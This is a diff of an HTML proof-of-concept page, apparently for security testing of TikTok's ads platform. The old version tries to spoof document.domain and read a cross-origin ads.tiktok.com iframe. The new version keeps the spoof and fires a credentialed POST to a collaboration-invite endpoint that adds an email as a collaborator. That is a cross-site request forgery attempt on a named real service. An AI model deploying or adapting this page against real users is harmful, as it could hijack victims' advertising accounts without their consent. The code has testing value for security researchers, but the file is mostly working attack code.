@@ -1,35 +1,35 @@
-<!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC – document.domain spoof test</title>
-    <script>
-      try {
-        Object.defineProperty(document, 'domain', {
-          value: 'ads.tiktok.com',
-          writable: true
-        });
-        console.log('[+] Spoofed document.domain: ', document.domain);
-      } catch (e) {
-        console.error('[!] Could not spoof domain:', e.message);
-      }
-      window.onload = function () {
-        const iframe = document.createElement('iframe');
-        iframe.src = 'https://ads.tiktok.com/';
-        iframe.style = "width:600px; height:400px;";
-        iframe.onload = function () {
-          try {
-            const doc = iframe.contentWindow.document;
-            console.log('Access to the iframe:', doc.body.innerHTML);
-          } catch (err) {
-            console.log('Access blocked:', err.message);
-          }
-        };
-        document.body.appendChild(iframe);
-      };
-    </script>
-  </head>
-  <body>
-    <h2>Hello</h2>
-  </body>
+<head>
+  <title>SOP Test Page</title>
+  <script>
+    try {
+      Object.defineProperty(document, 'domain', {
+        value: 'ads.tiktok.com',
+        writable: true
+      });
+      console.log('[+] Spoofed document.domain: ', document.domain);
+    } catch (e) {
+      console.error('[!] Spoof failed:', e.message);
+    }
+
+    window.onload = function () {
+      const origin = location.origin;
+      console.log('[*] Page origin:', origin);
+      fetch("/CreativeOne/Client/ClientInviteCollaborationUser", {
+        method: "POST",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          targetEmails: ["test@example.com"],
+          role: 2
+        })
+      }).then(res => res.text()).then(console.log).catch(console.error);
+    };
+  </script>
+</head>
+<body>
+  <h1>Hi</h1>
+</body>
 </html>
+
 
